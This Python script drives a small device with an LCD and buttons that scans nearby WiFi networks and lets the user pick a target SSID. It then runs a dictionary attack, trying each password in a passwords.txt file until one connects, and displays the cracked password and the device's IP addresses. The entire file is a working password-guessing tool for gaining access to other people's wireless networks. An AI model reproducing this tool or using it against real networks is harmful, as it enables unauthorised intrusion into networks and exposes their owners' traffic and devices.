import subprocess 
from termcolor import cprint
from time import sleep
import sys
import os

import wifitool
import lcd
import buttontool


cprint("Initializing LCD...", "green")    
lcd.init()

lcd.message("Initializing...", "WifiTool INIT")
wifi = wifitool.WifiTool('wlan0')

lcd.message("Initializing...", "ButtonTool INIT")
buttontool.init()

while True:
    lcd.message("Initializing...","Preparing WiFi")
    
    cprint("Shutting down all connections...")
    
    exit_code = 1
    while exit_code:
        exit_code = subprocess.call(f"{os.path.dirname(__file__)}/con_down_all.sh")
        if exit_code:
            cprint(f"./con_down_all.sh exited with {exit_code}") 
    sleep(20)

    btn = buttontool.BTN_RST
    while btn == buttontool.BTN_RST:
        lcd.message("Scanning...", "")
        
        fail_counter = 0
        while fail_counter != -1:
            try:
                lcd.message("Scanning WiFi...", "" if fail_counter == 0 else f"Attempt #{fail_counter + 1}") 
                scanres = wifi.scanWifi()
                fail_counter = -1
            except Exception as e:
                fail_counter += 1
                if fail_counter == 10:
                    lcd.message("WiFi Scan Fail", "Restarting...")
                    os.execl(sys.executable, sys.executable, *sys.argv)

        for i in range(len(scanres)):
            cprint(f"{i}: {scanres[i]}", 'cyan')
        
        i = -1
        total = len(scanres)
        btn = buttontool.BTN_DWN
        while btn == buttontool.BTN_DWN:
            i += 1
            if i == total:
                i = 0
            ssid = scanres[i]
            cprint(f"-> {ssid}", 'cyan')
            line1 = f"Pick SSID ({i + 1}/{total})"
            line2 = f"{ssid}"
            lcd.message(line1, line2)
            btn = buttontool.input()
       
    cprint(f"SSID: {ssid}", 'cyan')
    
    success = False
    with open(f"{os.path.dirname(__file__)}/passwords.txt",'rt') as file:
        for line in file.readlines():
            password = line.strip()
            cprint(f"Attempting password: {password}", "yellow")
            lcd.message(f"Attempting...", password)
            if wifi.connect_wifi(ssid,password):
                success = True
                break
            sleep(10)
    
    ips = str(subprocess.check_output(["hostname", "-I"]),"ascii").splitlines()
    ipx = 0
    btn = buttontool.BTN_DWN
    while btn != buttontool.BTN_RST: 
        if success:
            if btn == buttontool.BTN_SEL:
                if show_ssid:
                    lcd.message("SUCCESS", ssid)
                else:
                    lcd.message("SUCCESS", password)
                show_ssid = not show_ssid
                ipx = 0
            else: #BTN_DWN
                lcd.message("SUCCESS", ips[ipx])
                ipx += 1
                if ipx >= len(ips):
                    ipx = 0
                show_ssid = True
        else:
            lcd.message("FAIL","")
        btn = buttontool.input()
